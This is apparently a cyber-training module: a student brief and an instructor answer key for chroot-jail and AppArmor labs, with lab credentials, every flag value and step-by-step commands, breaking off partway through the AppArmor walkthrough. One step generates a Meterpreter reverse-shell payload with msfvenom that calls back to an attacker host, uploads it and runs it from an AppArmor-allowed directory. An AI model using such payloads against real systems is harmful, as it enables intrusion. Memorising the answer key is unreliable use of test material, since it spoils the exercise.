# Collie and Cow Student Brief

## Objective

This module develops evidence-based analysis in restricted Linux environments. Students should identify environment type, validate control boundaries, and demonstrate adaptive execution under filesystem and policy constraints.

### Training caveat

Some actions in these labs are intentionally artificial, compressed, or staged for training. Treat them as simulations of investigative tasks you may need to perform across a variety of real operational situations, not as a claim that every step exactly mirrors a single real-world incident.

## Context

You will operate in restricted Linux execution contexts (chroot and AppArmor). Your goal is to identify the active constraint model, prove what is blocked or allowed, and adapt collection paths without jumping directly to solution commands.

## Tasks

### Chroot Jail Investigation

### Environment

A constrained shell entry point is provided on a TCP port (non-PTY interaction). In the default build, the initial prompt begins in `/opt/lab21`.

Expected flags: 4.

### Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`collie-21`|20.30.40.21|N/A (shell service)|N/A|TCP shell service (default often TCP `4444`)|

### Tasks

1. Establish runtime context (identity, working path, process visibility, and filesystem boundaries) from the constrained shell.
2. Determine the environment type and justify that conclusion with concrete host evidence.
3. Document tooling limitations and demonstrate at least one adaptation strategy used because of those limits.
4. Recover all four flags in this environment.
5. For each flag, record both the recovery method and the evidence/output that validates the result.

#### Report and submission

Submit a concise environment assessment that answers: what environment you operated in, how you proved it, what constraints were encountered, and how you adapted. Include the recovery method and validating evidence for each flag, following instructor assessment criteria.

### AppArmor Restriction Investigation

### Environment

A standard Linux shell is provided with AppArmor enabled in enforcing mode.

Expected flags: 5.

### Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`cow-22`|20.30.40.22|`badguy`|`badGuy!QAZ1qaz`|SSH (TCP 22)|

### Tasks

1. Confirm AppArmor status and identify relevant profile state and policy locations.
2. Identify and exercise lab-related helper/gate scripts in normal administrative paths.
3. Execute an uploaded payload through the gate from its initial location and capture blocked/denied behavior.
4. Collect denial and policy evidence from native host artifacts and correlate it to the blocked action.
5. Identify an allowed execution path from policy evidence, run the same payload from that path, and validate successful behavior.
6. Recover all five flags and document the command/evidence chain for each.

#### Clues and constraints

- Use native host evidence (for example kernel/system logs and policy files) to prove both denied and allowed outcomes.
- One flag depends on process-context analysis using standard runtime metadata.

#### Report and submission

Submit a structured explanation of how AppArmor affected workflow, which action was denied, which alternate action was allowed, and what host evidence validates each conclusion. Include all five flags with corresponding recovery evidence, following instructor assessment criteria.

## Deliverables / Evidence

- Submit all flags for Labs 2.1 and 2.2 with recovery method and validating host evidence.
- Include a short comparison of chroot constraints versus AppArmor policy constraints.
- Document at least one adaptation used in each lab when a default path or tool was constrained.

## Constraints

- Prove constraint boundaries from native artifacts (runtime metadata, policy files, logs) before selecting bypass/adaptation actions.
- Use ordinary administrative evidence paths rather than training-only shortcuts.
- Record denied and allowed outcomes with command evidence.

## Success Criteria

You successfully complete this Module when you can identify each restriction model, prove blocked-versus-allowed behavior from host artifacts, and recover all flags with clear adaptation rationale.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Collie and Cow — Instructor Answer Key

## lab 2.1 answer key

# Lab 2.1 — Chroot Jail from Constrained Shell — Answer Key (Instructor Only)

Use this as a live walkthrough. Students begin from the same constrained shell entry point, prove the chroot context from evidence, adapt to missing tools, and recover four flags through filesystem inspection, compressed/binary clue handling, loopback services, and `/proc` process context.

## Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`collie-21`|20.30.40.21|N/A (shell service)|N/A|TCP shell service (default often TCP `4444`)|

If the instructor or range card provides a different target or port, use those assigned values.

## Flag Reference

|Flag ID|Default recovery source|Hiera key|Default value|
|---|---|---|---|
|`hidden_flag`|Decode encoded content from a clue file in the starting directory using the custom decoder named in the compressed usage note|`cs_ops::lab_2_1::flags::hidden_flag`|`SHADOW-LOCKET`|
|`parsing_flag`|Reconstruct from keep-state file references listed in `/opt/lab21/notes/fragments.txt`|`cs_ops::lab_2_1::flags::parsing_flag` plus `cs_ops::lab_2_1::parsing_fragments`|`FRACTAL-LENS`|
|`loopback_flag`|Response from the host loopback TCP service after sending `1234` to `127.0.0.1:4545`|`cs_ops::lab_2_1::flags::loopback_flag`|`ORBIT-CIRCUIT`|
|`procfs_flag`|Response from the host loopback TCP service after sending the parent-process token from `/proc/$PPID/environ` to `127.0.0.1:4646`|`cs_ops::lab_2_1::flags::procfs_flag`|`KESTREL-THREAD`|

Related tunables:

|Setting|Purpose|Default|
|---|---|---|
|`cs_ops::lab_2_1::hidden_flag_file_name`|File name created in the starting directory for hidden-flag decode input|`cache.id`|
|`cs_ops::lab_2_1::hidden_flag_encoded`|Encoded value stored in that file; it should decode to `hidden_flag`|`ZOHKVD-SVJRLA`|
|`cs_ops::lab_2_1::loopback_flag_port`|Loopback service for the fixed-input flag|`4545`|
|`cs_ops::lab_2_1::procfs_flag_port`|Loopback service for the parent-environment token flag|`4646`|
|`cs_ops::lab_2_1::paths`|README, clue chain, decoder, compressed note, and fragment-reference paths|See `environments/week3_repo/vms/puppet/data/nodes/lab_2_1.yaml`|

## Recommended Instructor Walkthrough

### 1. Connect using the constrained shell path

From the instructor attack host:

```
nc <target-ip> 4444
```

If `nc` is unavailable:

```
socat - TCP:<target-ip>:4444
```

Why this matters:

- This mirrors the student starting point exactly: no SSH login, no pre-built TTY.
- The lab rewards context discovery after access, not credential guessing.

### 2. Establish situational awareness baseline

Run:

```
date -u
whoami
id
pwd
hostname
echo "$SHELL"
ps -p $$ -o pid,ppid,args=
env | sort | sed -n '1,20p'
uname -a
sed -n '1,40p' /etc/os-release 2>/dev/null || sed -n '1,40p' /proc/version
who 2>/dev/null || true
w 2>/dev/null || true
ps aux
ss -tulpen 2>/dev/null || netstat -tulpen
ss -tunap 2>/dev/null || netstat -tunap
```

Why this matters:

- Students should anchor time, identity, shell/interpreter chain, OS/runtime details, active users, process state, and TCP/UDP sockets before flag work.
- In this constrained shell, failed commands are still evidence of the tool boundary.

Expected findings:

- `pwd` begins at `/opt/lab21` in the default build.
- Identity may be `root`, but the filesystem and shell context are constrained.
- `ss` and `netstat` are typically missing or fail in this jail. That is expected. Record the tool gap; do not hunt listener ports from a socket dump.
- Do not try to discover `4545` or `4646` here. Those values come from `README.first` in Step 5.

### 3. Prove constrained non-PTY behavior

Run:

```
tty
stty -a
```

Expected behavior:

- `tty` often reports `not a tty`.
- `stty` typically errors because there is no controlling terminal device.

Teaching point:

- Students do not need to upgrade the session to pass. They need to adapt their workflow to the shell they have.

### 4. Identify the chroot context

Run:

```
ls -di /
ls -la /
ls -la /bin
ls -la /lib /lib64 2>/dev/null
sed -n '1p' /proc/1/comm
mount 2>/dev/null | sed -n '1,20p'
```

Why this matters:

- These checks build evidence without relying on high-level tooling.
- Minimal filesystem shape, process observations, and mounted `/proc` behavior support a chroot conclusion.

Acceptable student conclusion:

- "This is a chroot jail (or chrooted environment), reached through a constrained non-PTY shell."

Expected `/proc` findings:

- `/proc` should show PID directories (`1`, `self`, and the current shell). If `ls /proc` is empty, the chroot proc mount is down. Stop the flag hunt and remount from the **host** (see Troubleshooting). Do not treat an empty `/proc` as the Step 11 puzzle.

### 5. Confirm tool limits and read the in-environment README

Run:

```
find / -maxdepth 2 -type f 2>/dev/null
grep -R "flag" /opt 2>/dev/null
ls -la
sed -n '1,120p' README.first
```

Why this matters:

- `find`, `grep`, and `file` are intentionally absent in the jail.
- The student handout no longer gives flag-specific clues; `README.first` is the student-facing instruction surface after access.

Expected `sed -n '1,120p' README.first` output:

```
Start by mapping this filesystem and recording what tools are missing.
This README is the instruction surface for the flags in this jail.
For one flag, read /usr/share/doc/base-files/runtime-notes and follow the chain until you find the flag.
For one flag, reconstruct the value from references in /opt/lab21/notes/fragments.txt.
For one flag, query the loopback-only TCP service at 127.0.0.1:4545 and send exactly 1234 followed by a newline.
For one flag, review parent process environment evidence at /proc/$PPID/environ, extract LAB21_SESSION_TOKEN, and send only that token plus a newline to 127.0.0.1:4646.
Use fundamental commands and inspect files before executing custom helpers.
```

How students know the next values:

- The README provides the first file to inspect for the filesystem chain (`/usr/share/doc/base-files/runtime-notes`). Follow that chain in Steps 6–8.
- It identifies `/opt/lab21/notes/fragments.txt` as the reconstruction manifest (Step 9).
- Park the two loopback lines for later. Step 10 uses `127.0.0.1:4545` and payload `1234`. Step 11 uses `/proc/$PPID/environ`, `LAB21_SESSION_TOKEN`, and `127.0.0.1:4646`. Those are README values, not ports found with `ss`/`netstat`.

### 6. Follow the README chain to the binary clue

Run:

```
ls -la /usr/share/doc/base-files
sed -n '1,120p' /usr/share/doc/base-files/runtime-notes
```

Expected output:

```
Runtime package note
The maintenance cache map is stored at /var/lib/dpkg/info/.cache.map.
Strip NUL bytes from it to reveal NEXT_HINT.
```

Why this matters:

- This replaces the old direct `.cache` clue. Students must follow a file in another accessible directory before reaching the binary artifact.
- The note tells them to expect non-text data, so blindly dumping the file is not the only reasonable path.

### 7. Extract the embedded string from the binary-looking file

Run:

```
ls -l /var/lib/dpkg/info/.cache.map
wc -c /var/lib/dpkg/info/.cache.map
tr -d '\000' < /var/lib/dpkg/info/.cache.map
```

Expected findings:

- `ls -l` and `wc -c` show a file of roughly 10 KiB. That size is mostly NUL padding, not a large real dataset.
- `tr -d '\000'` deletes NUL bytes (`tr` = translate/delete; `-d` = delete; `'\000'` is the NUL byte) so the hidden printable text is readable without `strings` (absent here).
- The printable result is a **path**, not a flag: `NEXT_HINT=/var/log/apt/term.log.1.gz`.
- The `.gz` suffix means gzip. The next operator action is to decompress that file (`gzip -dc` in Step 8), not treat `NEXT_HINT` as the answer.

Expected printable excerpt:

```
NEXT_HINT=/var/log/apt/term.log.1.gz
```

How students know this command is justified:

- Step 6 `runtime-notes` explicitly says to strip NUL bytes and look for `NEXT_HINT`.
- `tr` is part of the limited baseline toolset and can delete a specific byte value without `strings`, `grep`, or `file`.

### 8. Read the compressed usage note and inspect the decoder

Run:

```
gzip -dc /var/log/apt/term.log.1.gz
command -v restore-cache
sed -n '1,120p' "$(command -v restore-cache)"
ls -la
sed -n '1,5p' cache.id
```

Expected compressed note:

```
Cache recovery usage
The decoder command is on PATH as restore-cache.
Example: restore-cache cache.id
```

Expected decoder excerpt:

```
#!/bin/sh
if [ "$#" -ne 1 ]; then
  printf "%s\n" "usage: restore-cache <file-name>"
  exit 1
fi
input_file="${1##*/}"
if [ ! -r "$input_file" ]; then
  printf "%s\n" "cannot read input file: $input_file"
  exit 1
fi
encoded="$(tr -d "\n" < "$input_file")"
decoded="$(printf "%s" "$encoded" | tr "HIJKLMNOPQRSTUVWXYZABCDEFG3456789012" "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")"
printf "%s\n" "$decoded"
```

Expected `ls -la` excerpt from `/opt/lab21`:

```
cache.id
README.first
notes
```

Expected `sed -n '1,5p' cache.id` output:

```
ZOHKVD-SVJRLA
```

Why this matters:

- The compressed file gives an example, but students still need to verify the helper before executing it.
- The filename in the sample usage matches a file in the starting directory, guiding students to pass that name.

Recover the flag:

```
restore-cache cache.id
```

Expected output:

```
SHADOW-LOCKET
```

Flag recovered:

- `hidden_flag` = `SHADOW-LOCKET` by default.

### 9. Recover the reconstruction flag from distributed file references

Run:

```
sed -n '1,120p' /opt/lab21/notes/fragments.txt
```

Expected output:

```
challenge=resolve_fragment_references
format=slot_NN|state=keep|value=<file-path>
slot_03|state=keep|value=/var/lib/dpkg/info/base-files.list.d
slot_90|state=drop|value=/var/tmp/.font-unix-cache
slot_01|state=keep|value=/etc/apt/preferences.d/00-cache-state
slot_91|state=drop|value=/usr/share/common-licenses/.runtime-index
slot_02|state=keep|value=/usr/share/doc/bash/inputrc.sample
```

How students know the next step:

- The `format=` line documents that each `value=` entry is a file path reference.
- The manifest says to keep `state=keep` records and use slot order.

Inspect the referenced files manually:

```
sed -n '1,20p' /etc/apt/preferences.d/00-cache-state
sed -n '1,20p' /usr/share/doc/bash/inputrc.sample
sed -n '1,20p' /var/lib/dpkg/info/base-files.list.d
sed -n '1,20p' /var/tmp/.font-unix-cache
sed -n '1,20p' /usr/share/common-licenses/.runtime-index
```

Expected output excerpts:

```
fragment=FRA
fragment=CTAL
fragment=-LENS
fragment=DECOY-
fragment=IGNORE
```

Assemble the keep-state fragments in slot order:

```
p01="$(sed -n 's/^fragment=//p' /etc/apt/preferences.d/00-cache-state)"
p02="$(sed -n 's/^fragment=//p' /usr/share/doc/bash/inputrc.sample)"
p03="$(sed -n 's/^fragment=//p' /var/lib/dpkg/info/base-files.list.d)"
printf '%s%s%s\n' "$p01" "$p02" "$p03"
```

Expected output:

```
FRACTAL-LENS
```

Flag recovered:

- `parsing_flag` = `FRACTAL-LENS` by default.

### 10. Recover the loopback TCP flag

Return to the Step 5 `README.first` line: query the loopback-only TCP service at `127.0.0.1:4545` and send exactly `1234` followed by a newline. That is how students know the address, port, and payload. Step 2 `ss`/`netstat` cannot prove this listener; those tools are missing in the jail, and a remote scan from Kali will not see a `127.0.0.1` bind.

The login shell is `/bin/sh`. `sh` cannot open `/dev/tcp`. `/bin/bash` is in the chroot. `/dev/tcp/HOST/PORT` is a bash built-in, not a real file: opening it creates a TCP client. `nc` is typically missing too, so bash is the reliable sender.

```
bash -c 'exec 3<>/dev/tcp/127.0.0.1/4545; printf "1234\n" >&3; head -n 1 <&3'
```

First-use notes:

- `bash -c '...'` runs one bash snippet from the `sh` jail shell.
- `exec 3<>/dev/tcp/127.0.0.1/4545` attaches file descriptor `3` read/write (`<>`) to a TCP client socket on loopback port `4545`.
- `printf "1234\n" >&3` writes the README payload to that socket.
- `head -n 1 <&3` reads one line of the service response.

If `nc` happens to be present, this is also acceptable:

```
printf '1234\n' | nc 127.0.0.1 4545
```

Expected response:

```
ORBIT-CIRCUIT
```

Flag recovered:

- `loopback_flag` = `ORBIT-CIRCUIT` by default.

Teaching point:

- Chroot is filesystem isolation, not a new network namespace. Host loopback services still answer from inside the jail.

### 11. Recover the procfs-derived flag

Return to the Step 5 `README.first` line: review parent process environment at `/proc/$PPID/environ`, extract `LAB21_SESSION_TOKEN`, and send only that token plus a newline to `127.0.0.1:4646`. Same discovery source as Step 10; different port and payload.

Do **not** replace `$PPID` with a number from this key. `$PPID` is a shell variable: the parent PID of the **current** jail shell. Type `$PPID` as written.

Show that it expands to a live PID:

```
echo $PPID
```

Expected: a numeric PID (value varies per session). That number is the parent of this interactive `sh`. The token is in the parent environment (the bind-shell/socat service), not in this shell’s own `env`.

Read that parent environment. `/proc/<pid>/environ` is NUL-separated; `tr` turns NULs into newlines so it is readable:

```
tr '\0' '\n' < /proc/$PPID/environ
```

Expected environment excerpt:

```
LAB21_SESSION_TOKEN=toortoor
```

Capture the token, then reuse the Step 10 `/dev/tcp` pattern against port **4646**, sending the token plus newline (not `1234`):

```
TOKEN="$(tr '\0' '\n' < /proc/$PPID/environ | sed -n 's/^LAB21_SESSION_TOKEN=//p')"
bash -c 'exec 3<>/dev/tcp/127.0.0.1/4646; printf "%s\n" "'"$TOKEN"'" >&3; head -n 1 <&3'
```

How students know these values:

- Path `/proc/$PPID/environ`, variable `LAB21_SESSION_TOKEN`, host `127.0.0.1`, and port `4646` come from `README.first`.
- The `bash -c` / `/dev/tcp` method is the same adaptation as Step 10 because `nc`/`ss` are still unavailable.

Expected service response:

```
KESTREL-THREAD
```

Flag recovered:

- `procfs_flag` = `KESTREL-THREAD` by default.

Teaching point:

- Chroot changes the filesystem view, but mounted `/proc` can still expose parent-process metadata that this shell’s environment does not.

### 12. Close with required report language

Students should be able to state:

- Access method was a constrained non-PTY shell.
- Environment was a chroot jail, supported by concrete enumeration evidence.
- Tooling was limited, requiring alternate enumeration and extraction methods.
- Four flags were recovered through a README-led evidence chain, distributed file references, loopback network interaction, and parent-process metadata.

## Troubleshooting and Confirmation

If a fresh Collie or Cow deploy does not match this key, the host repair commands are in B03 range host recovery (`course/operations/b03-range-host-recovery.md`).

- If the old `/opt/lab21/.cache/.index/.flag` file exists, the host has stale content from an earlier build. Reapply Puppet and confirm `legacy_hidden_flag_file` is absent.
- If `/var/log/apt/term.log.1.gz` is missing, check that the Puppet `cs_ops_lab21_generate_compressed_usage` exec ran and that `/bin/gzip` exists on the host applying Puppet.
- If `/var/lib/dpkg/info/.cache.map` is much smaller than 10 KiB or lacks `NEXT_HINT=`, check the `cs_ops_lab21_generate_binary_clue` exec.
- If `restore-cache` is not found, confirm `/usr/local/bin` is in the shell `PATH` or run `/usr/local/bin/restore-cache <file-name>`.
- If loopback commands hang, verify the host services `cs-ops-lab21-loopback-flag.service` and `cs-ops-lab21-procfs-flag.service` are running and that the configured Hiera ports match the README.
- If `bash -c` / `/dev/tcp` fails, confirm `/bin/bash` exists in the jail (`command -v bash` or `ls -l /bin/bash`). The login shell is `/bin/sh`; `/dev/tcp` is a bash built-in.
- If `LAB21_SESSION_TOKEN` is empty, re-run `echo $PPID` in **this** jail shell and read `/proc/$PPID/environ` again. Do not paste a PID from this key or from another session.
- If `/proc` is empty inside the jail (`ls /proc` shows no PID directories), the chroot proc filesystem is not mounted. That is a host mount problem, not a student discovery step. From a **host** root shell (RDP/SSH to the VM, not the TCP 4444 jail), remount and confirm, then reconnect to the jail:
    - `mountpoint /srv/chroot/fs/proc` (expect “is a mountpoint”)
    - If it is not: `mount -t proc proc /srv/chroot/fs/proc`
    - `ls /srv/chroot/fs/proc | sed -n '1,20p'` should show `1`, `self`, and numeric PIDs
    - Re-enter the jail and retry `echo $PPID` then `tr '\0' '\n' < /proc/$PPID/environ`
    - A reboot drops a one-shot Puppet exec mount. Reapply Puppet or remount as above. The in-jail `/etc/fstab` is student evidence only; the host does not mount from it.
- If instructors rotate `hidden_flag`, also rotate `hidden_flag_encoded` so the file content still decodes to the new flag with the script's substitution map, and keep `hidden_flag_file_name` aligned with the intended clue file. Update expected answer key values accordingly. If rotating `parsing_flag`, update `parsing_fragments` so keep-state slots assemble to the new value.

## Grading Checkpoints

1. **Access context:** Student identifies constrained/non-PTY shell behavior.
2. **Environment identification:** Student correctly identifies a chroot or chroot jail.
3. **Evidence quality:** Student provides technical indicators, not only a guess.
4. **Adaptation:** Student demonstrates alternatives after tool limits, such as printable extraction from a binary-looking file without `strings`.
5. **Filesystem chain:** Student follows the README to the text clue, binary clue, compressed note, decoder inspection, clue filename, encoded file content, and decoded flag.
6. **Distributed reconstruction:** Student uses file references from `fragments.txt`, ignores drop-state records, and assembles keep-state fragments in slot order.
7. **Network/process flags:** Student recovers both loopback-service flags with reproducible command evidence.
8. **Reporting:** Student ties each flag to the recovery method and validating output.

## Acceptable Answers

- Equivalent command sequences are acceptable if they prove the same points.
- For flags, require exact value matches unless the class rubric explicitly allows partial credit.
- For chroot evidence, accept any technically valid combination of filesystem shape, process context, mount/root observations, and constrained-shell behavior.
- For the binary clue, any method that extracts the printable `NEXT_HINT=` value without relying on unavailable tooling is acceptable.

## lab 2.2 answer key

# Lab 2.2 — AppArmor Objective Impact Lab — Answer Key (Instructor Only)

Use this as a live walkthrough. The goal is to start from the same shell access students receive, prove AppArmor is actively shaping outcomes, show a blocked objective path, pivot to an allowed path without privilege escalation, and recover all five flags.

## Access

|Hostname (expected)|IP address|Username|Password|Connection|
|---|---|---|---|---|
|`cow-22`|20.30.40.22|`badguy`|`badGuy!QAZ1qaz`|SSH (TCP 22)|

If the instructor or range card provides a different login, use those assigned values.

## Flag Reference

|Flag ID|Default location in the default build|Hiera key|Default value (if key omitted)|
|---|---|---|---|
|`mac_id_flag`|Output of `/usr/local/bin/system-maint-check`|`cs_ops::lab_2_2::flags::mac_id_flag`|`AEGIS-MARK`|
|`denial_flag`|Native AppArmor denial evidence (for blocked run) visible in one of: `dmesg`, `journalctl -k`, or `/var/log/syslog`/`/var/log/kern.log`|`cs_ops::lab_2_2::flags::denial_flag`|`THORN-BARRIER`|
|`upload_flag`|Output of `/usr/local/bin/objective-gate-check` after successful execution from allowed path|`cs_ops::lab_2_2::flags::upload_flag`|`VECTOR-ASCENT`|
|`allowed_path_flag`|Output of `/usr/local/bin/objective-gate-check` after successful execution from allowed path|`cs_ops::lab_2_2::flags::allowed_path_flag`|`CLEAR-PASSAGE`|
|`objective_flag`|Process-context objective from `runtime-cache-worker` environment (`OBJECTIVE_FLAG` via `/proc/<pid>/environ`)|`cs_ops::lab_2_2::flags::objective_flag`|`RUNTIME-NEXUS`|

Set under `cs_ops::lab_2_2::flags` in Hiera (example: `environments/week3_repo/vms/puppet/data/nodes/lab_2_2.yaml`). Defaults are defined in `environments/week3_repo/vms/puppet/modules/cs_ops/manifests/lab_2_2.pp`.

## Recommended Instructor Walkthrough

### 1. Connect and establish situational awareness baseline

Run:

```
ssh badguy@<target-ip>
date -u
hostname
whoami
id
pwd
echo "$SHELL"
ps -p $$ -o pid,ppid,args=
env | sort | sed -n '1,20p'
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
```

Why:

- This is the B03.M01 Linux SA first pass after SSH, before MAC work. Record time, identity, shell/process chain, OS, users, processes, and sockets so later AppArmor evidence has a host baseline.
- This is a normal SSH host (unlike Lab 2.1). Socket listing is orientation, not the flag hunt. Lab 2.2 answers are in policy, logs, and process context.

Arguments:

- `date -u` — UTC, so kernel-log timestamps can be correlated later.
- `ps -p $$ -o pid,ppid,args=` — `$$` is this shell; show its PID, PPID, and args.
- `env | sort | sed -n '1,20p'` — `sed -n '1,20p'` prints lines 1–20 so the demo stays short.
- `ss -tulpen` — TCP/UDP listeners; `-p` process, `-n` numeric. `ss -tunap` is established/active sockets.

### 2. Confirm AppArmor is active

Run:

```
aa-status
```

Why:

- After SA, student task 1 is confirm AppArmor. `aa-status` is the native status tool. As an unprivileged user it confirms the module is loaded but cannot enumerate profiles or enforcement mode.
- That privilege limitation is expected and is itself evidence: the student is operating without root, so profile details must come from the policy files on disk.

Expected output:

```
apparmor module is loaded.
You do not have enough privilege to read the profile set.
```

Acceptable student conclusion:

- "AppArmor is loaded. I cannot read profile state from `aa-status` without root. Next step: inspect `/etc/apparmor.d` directly."

### 3. Enumerate AppArmor profiles and identify governed binaries

Run:

```
ls -la /etc/apparmor.d/
```

Why:

- `/etc/apparmor.d` is the standard directory for AppArmor profile source files. Since `aa-status` could not list profiles, this is the next discoverable path.
- AppArmor profile filenames encode the full path of the governed binary with dots replacing slashes (for example `usr.local.bin.objective-gate-check` governs `/usr/local/bin/objective-gate-check`). That naming convention is how students identify which binaries on this host are policy-controlled.

Expected findings (lab-specific profiles among standard ones):

- `usr.local.bin.system-maint-check` → governs `/usr/local/bin/system-maint-check`
- `usr.local.bin.objective-gate-check` → governs `/usr/local/bin/objective-gate-check`
- `usr.local.sbin.runtime-cache-worker` → governs `/usr/local/sbin/runtime-cache-worker`

These filenames tell us to look in `/usr/local/bin` and `/usr/local/sbin`. That is the only reason those directories are examined next.

Run:

```
ls -la /usr/local/bin
ls -la /usr/local/sbin
```

Why:

- The profile filenames point here. Listing confirms the binaries exist, are executable, and shows any other local tools students might encounter.

Expected findings:

- `/usr/local/bin/system-maint-check`
- `/usr/local/bin/objective-gate-check`
- `/usr/local/sbin/runtime-cache-worker`

### 4. Read the gate profile to understand deny and allow rules

Run:

```
sed -n '1,80p' /etc/apparmor.d/usr.local.bin.objective-gate-check
```

Why:

- Of the three profiles, `objective-gate-check` matches the student task (exercise a gate script against an uploaded binary). That task alignment is why this profile is read first, not the other two.
- The profile shows the deny and allow rules that will drive the rest of the lab.

Arguments:

- `sed -n '1,80p'` — print a bounded window rather than unbounded `cat`.

Expected gate-profile excerpt:

```
/usr/local/bin/objective-gate-check {
  /home/badguy/downloads/** rwkl,
  audit deny /home/badguy/downloads/** x,
  /var/tmp/.cache-bin/** rix,
}
```

The profile file does not contain `flags=(enforce)`. Enforcement is what `sudo aa-status` shows for this profile.

Why these stanzas matter:

- `rwkl` on `/home/badguy/downloads/**` — students can write (upload) files there.
- `audit deny … x` on the same tree — execute is blocked, and the denial is written to the kernel log. A quiet `deny` would block with no `name=` line.
- `rix` on `/var/tmp/.cache-bin/**` — read, inherit, execute is allowed from this path. This is the pivot directory for later steps. It is a world-writable sticky dir, not a privilege escalation.

### 5. Review the runtime README (instructor breadcrumb gap)

Run:

```
sed -n '1,80p' /usr/share/doc/system-runtime/README.runtime
```

Why:

- This file is Puppet-created lab documentation that outlines the full objective workflow. It is placed at a standard location under `/usr/share/doc`, but **no artifact discovered in Steps 1–4 currently points students to it**. In a live demo the instructor can direct students here, but for unassisted student work this is a gap.

> **Instructor action required:** Either add a breadcrumb to `/usr/share/doc/system-runtime/README.runtime` in an artifact students have already found (for example in the output of `system-maint-check` or the gate profile comments), or add a clue in the student handout for Lab 2.2 directing students to check `/usr/share/doc` for host documentation after confirming AppArmor. Do not update the student handout in this change; track this as a separate follow-up.

Expected `sed -n '1,80p' /usr/share/doc/system-runtime/README.runtime` excerpt:

```
# Runtime Control Notes
1) Confirm AppArmor is active and enforcing policy.
2) Upload a remote-shell style payload binary under your writable area.
3) Use /usr/local/bin/objective-gate-check to test a blocked execution path and inspect native AppArmor evidence (dmesg, journalctl -k, syslog/kern.log).
4) Discover an allowed execution path by inspecting AppArmor profiles under /etc/apparmor.d.
5) Execute the payload directly from an allowed path, then run /usr/local/bin/objective-gate-check again against the running payload to recover gate flags.
6) Discover one objective via process context: identify runtime-cache-worker process details and inspect `/proc/<pid>/environ` for objective evidence.
7) Collect the five flags:
   - mac_id_flag from /usr/local/bin/system-maint-check
   - denial_flag from native AppArmor denial evidence
   - upload_flag and allowed_path_flag from successful gate validation
   - objective_flag from process context evidence
```

### 6. Recover flag 1 (`mac_id_flag`)

Run:

```
sed -n '1,80p' /usr/local/bin/system-maint-check
/usr/local/bin/system-maint-check
```

Why:

- Step 3 identified this binary from the AppArmor profile filename `usr.local.bin.system-maint-check`. The README (Step 5) confirms `mac_id_flag` comes from it. Inspect first because it is a lab script: confirm it only prints status/flag evidence and does not modify the host.
- Running it (not stopping at `sed`) is required because the flag is base64-obfuscated in the file. `cat` is not a complete solve.

Arguments:

- `sed -n '1,80p'` — bounded inspect of the helper, same reason as Step 4.

Expected finding:

- Output includes `mac_id_flag=...`.

Expected helper inspect excerpt:

```
echo 'AppArmor profile located. Validate with aa-status.'
echo "mac_id_flag=$(printf '%s' '<b64>' | /usr/bin/base64 -d)"
```

Expected helper output:

```
AppArmor profile located. Validate with aa-status.
mac_id_flag=AEGIS-MARK
```

Flag recovered:

- `mac_id_flag` = `AEGIS-MARK` by default.

### 7. Upload a remote-shell binary and demonstrate blocked objective path

From attacker host, generate and upload a remote-shell style payload (Meterpreter example):

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4445 -f elf -o /tmp/runtime_probe.elf
scp /tmp/runtime_probe.elf badguy@<target-ip>:/home/badguy/downloads/runtime_probe.elf
```

Why:

- The upload directory is not guessed: the README says “writable area,” a home listing shows `downloads`, and the Step 4 profile grants `rwkl` while denying `x` on `/home/badguy/downloads`.
- Any student-supplied executable is acceptable. Meterpreter is one example, not a required payload.

Arguments:

- `-p linux/x64/meterpreter/reverse_tcp` — payload type.
- `LHOST` / `LPORT` — instructor-chosen ops-station callback (example 4445; not a lab tunable).
- `-f elf -o …` — write an ELF file.

On target:

```
sed -n '1,120p' /usr/local/bin/objective-gate-check
chmod +x /home/badguy/downloads/runtime_probe.elf
/usr/local/bin/objective-gate-check /home/badguy/downloads/runtime_probe.elf
echo $?
```

Why:

- Inspect the gate before use because it is a lab helper. Usage is `objective-gate-check <binary_path>`. On an upload-dir path the script creates `.aa-deny-<denial_flag>-<epoch>` and tries to exec that name. AppArmor denies `x`, which is why the later kernel `name=` field contains the flag. Failure text then names dmesg, journalctl, and syslog.
- `chmod +x` is required for an exec check. `echo $?` records the non-zero blocked status. Do not take flags 3–4 from this failed run.

Arguments:

- `sed -n '1,120p'` — bounded inspect of the gate script.

Expected behavior:

- Gate execution from upload path fails.
- Failure message indicates blocked/failed execution under current constraints.

Expected gate failure output:

```
Execution blocked from upload path under current MAC policy.
Collect native evidence from dmesg, journalctl -k, or syslog/kern.log.
```

### 8. Recover flag 2 (`denial_flag`) from native AppArmor evidence

Run an unfiltered (or bounded) native read first. After AppArmor lines are visible, the `grep` forms below are optional noise reduction.

**Option A: `dmesg`**

```
dmesg
# Optional after AppArmor lines are visible:
# dmesg | grep -i apparmor | tail -n 40
```

**Option B: `journalctl -k`**

```
journalctl -k --no-pager
# Optional after AppArmor lines are visible:
# journalctl -k --no-pager | grep -i apparmor | tail -n 40
```

**Option C: `/var/log/syslog` or `/var/log/kern.log`**

```
sed -n '1,80p' /var/log/syslog
sed -n '1,80p' /var/log/kern.log
# Optional after AppArmor lines are visible:
# grep -i apparmor /var/log/syslog | tail -n 40
# grep -i apparmor /var/log/kern.log | tail -n 40
```

Why:

- Step 7 gate stderr named these three native families. AppArmor denials are kernel LSM events, so `dmesg`, `journalctl -k`, and syslog/kern.log are the same evidence family, not three different puzzles.
